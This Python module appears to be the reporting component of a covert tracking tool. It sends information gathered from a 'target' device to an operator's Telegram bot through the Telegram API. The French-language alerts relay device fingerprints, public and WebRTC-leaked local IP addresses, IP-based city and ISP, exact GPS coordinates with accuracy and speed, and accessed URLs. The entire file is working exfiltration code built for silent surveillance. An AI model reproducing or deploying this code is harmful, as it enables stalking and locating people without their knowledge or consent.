import utils
import requests
from json import dumps, loads

R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'   # white
Y = '\033[33m'  # yellow


def send_request(token, msg):
    api_url = f'https://api.telegram.org/bot{token[0]}:{token[1]}/sendMessage'
    api_params = {
        'chat_id': token[2],
        'text': msg,
        'parse_mode': 'HTML',
        'disable_web_page_preview': 'true'
    }
    rqst = requests.get(api_url, params=api_params, timeout=10)
    if rqst.status_code != 200:
        utils.print(f'{R}[-] {C}Telegram :{W} [{rqst.status_code}] {loads(rqst.text)["description"]}\n')


def tgram_sender(msg_type, content, token):
    json_str = dumps(content)
    json_content = loads(json_str)
    if msg_type == 'device_info':
        info_message = f"""
<b>🛰 GEOPOL ALERTE: CIBLE INTERCEPTÉE</b>

<b><u>SIGNATURE APPAREIL</u></b>
🖥 <b>OS :</b> <code>{json_content.get('os')}</code>
🌐 <b>Navigateur :</b> <code>{json_content.get('browser')}</code>
⚙️ <b>Architecture :</b> <code>{json_content.get('platform')}</code>
🧠 <b>Matériel :</b> <code>{json_content.get('cores')} Cores | {json_content.get('ram')} RAM</code>
🎮 <b>GPU :</b> <code>{json_content.get('vendor')} {json_content.get('render')}</code>
📱 <b>Écran :</b> <code>{json_content.get('ht')}x{json_content.get('wd')} | Touch: {json_content.get('touch', '0')} pts</code>

<b><u>TÉLÉMÉTRIE SILENCIEUSE</u></b>
🔋 <b>Batterie :</b> <code>{json_content.get('bat', 'N/A')}</code>
📶 <b>Réseau :</b> <code>{json_content.get('net', 'N/A')}</code>
🗣 <b>Langue :</b> <code>{json_content.get('lang', 'N/A')}</code>
🕛 <b>Fuseau Horaire :</b> <code>{json_content.get('tz', 'N/A')}</code>

<b><u>RÉSEAU</u></b>
🌍 <b>IP Publique :</b> <code>{json_content.get('ip')}</code>
📍 <b>IP Locale (WebRTC) :</b> <code>{json_content.get('webrtc', 'N/A')}</code>
"""
        send_request(token, info_message)

    if msg_type == 'ip_info':
        lat = str(json_content.get('lat', ''))
        lon = str(json_content.get('lon', ''))
        maps_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}" if lat and lon else ""
        map_line = f"🗺 <a href=\"{maps_link}\">[ LOCALISATION APPROXIMATIVE (IP/WebRTC) ]</a>\n" if maps_link else ""
        
        ip_message = f"""
<b>🌐 GEOPOL: DÉDUCTION IP OSINT</b>
🔍 <b>IP Ciblée :</b> <code>{json_content.get('target_ip_used')}</code>

📍 <b>Continent :</b> {json_content.get('continent')}
🏳️ <b>Pays :</b> {json_content.get('country')}
🗺 <b>Région :</b> {json_content.get('region')}
🏙 <b>Ville :</b> {json_content.get('city')}

🏢 <b>Fournisseur :</b> <code>{json_content.get('isp')}</code>
🏛 <b>Organisation :</b> <code>{json_content.get('org')}</code>

{map_line}
"""
        send_request(token, ip_message)

    if msg_type == 'location':
        # On s'assure d'enlever le spécificateur " deg" s'il est présent pour garantir la validité du lien Maps
        lat = str(json_content.get('lat', '')).replace(' deg', '').strip()
        lon = str(json_content.get('lon', '')).replace(' deg', '').strip()
        maps_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
        
        loc_message = f"""
<b>🎯 GEOPOL: FRAPPE GÉOLOCALISATION EXTREME</b>

📡 <b><u>COORDONNÉES GPS</u></b>
Latitude  : <code>{json_content.get('lat')}</code>
Longitude : <code>{json_content.get('lon')}</code>
Précision : <b>{json_content.get('acc')} mètres</b>

🧭 <b><u>DONNÉES SUPPLÉMENTAIRES</u></b>
Altitude  : <code>{json_content.get('alt')}</code>
Direction : <code>{json_content.get('dir')}</code>
Vitesse   : <code>{json_content.get('spd')}</code>

🗺 <a href="{maps_link}">[ OUVRIR DANS GOOGLE MAPS ]</a>
"""
        send_request(token, loc_message)

    if msg_type == 'url':
        url_msg = f"<b>🔗 LIEN ACCÉDÉ :</b>\n<code>{json_content.get('url')}</code>"
        send_request(token, url_msg)

    if msg_type == 'error':
        error_msg = f"<b>⚠️ ERREUR CIBLE :</b>\n<code>{json_content.get('error')}</code>"
        send_request(token, error_msg)
